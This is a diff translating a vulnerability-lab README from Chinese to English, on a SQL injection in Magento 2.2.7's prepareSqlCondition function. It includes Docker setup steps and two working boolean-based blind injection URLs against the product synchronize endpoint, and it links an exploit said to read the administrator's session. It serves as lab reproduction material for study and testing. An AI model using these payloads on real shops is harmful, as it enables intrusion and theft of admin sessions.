@@ -1,41 +1,43 @@
-# Magento 2.2 SQL注入漏洞
+# Magento 2.2 SQL Injection
 
-Magento（麦进斗）是一款新的专业开源电子商务平台，采用php进行开发，使用Zend Framework框架。设计得非常灵活，具有模块化架构体系和丰富的功能。
+[中文版本(Chinese version)](README.zh-cn.md)
 
-其prepareSqlCondition函数存在一处二次格式化字符串的bug，导致引入了非预期的单引号，造成SQL注入漏洞。
+Magento is a professional open-source e-commerce platform developed in PHP using the Zend Framework. It is designed to be highly flexible with a modular architecture and rich functionality.
 
-参考链接：
+A bug exists in its `prepareSqlCondition` function where a second string formatting introduces an unexpected single quote, leading to an SQL injection vulnerability.
+
+References:
 
 - https://www.ambionics.io/blog/magento-sqli
 - https://devdocs.magento.com/guides/v2.2/release-notes/ReleaseNotes2.2.8CE.html
 
-## 环境搭建
+## Environment Setup
 
-执行如下命令启动Magento 2.2.7：
+Execute the following command to start Magento 2.2.7:
 
 ```
 docker compose up -d
 ```
 
-环境启动后，访问`http://your-ip:8080`，即可看到Magento的安装页面。安装Magento时，数据库地址填写`mysql`，账号密码均为`root`，其他保持默认：
+After the server starts, visit `http://your-ip:8080` to see the Magento installation page. During installation, set the database address to `mysql`, username and password both as `root`, and keep other settings as default:
 
 ![](1.png)
 
-## 漏洞复现
+## Vulnerability Reproduction
 
-分别访问如下链接：
+Visit the following links:
 
 - `http://your-ip:8080/catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=%3f&ids[0][product_id][to]=)))+OR+(SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d0)+--+-`
 - `http://your-ip:8080/catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=%3f&ids[0][product_id][to]=)))+OR+(SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d1)+--+-`
 
-可见，在执行`))) OR (SELECT 1 UNION SELECT 2 FROM DUAL WHERE 1=1) -- -`和`))) OR (SELECT 1 UNION SELECT 2 FROM DUAL WHERE 1=0) -- -`时，返回的HTTP状态码不同：
+You can see that when executing `))) OR (SELECT 1 UNION SELECT 2 FROM DUAL WHERE 1=1) -- -` and `))) OR (SELECT 1 UNION SELECT 2 FROM DUAL WHERE 1=0) -- -`, the returned HTTP status codes are different:
 
 ![](2.png)
 
 ![](3.png)
 
-通过改变OR的条件，即可实现SQL BOOL型盲注。
+By changing the OR condition, you can perform SQL boolean-based blind injection.
 
-利用[这个POC](https://github.com/ambionics/magento-exploits)，可以读取管理员的session：
+Using [this POC](https://github.com/ambionics/magento-exploits), you can read the administrator's session:
 
 ![](4.png)
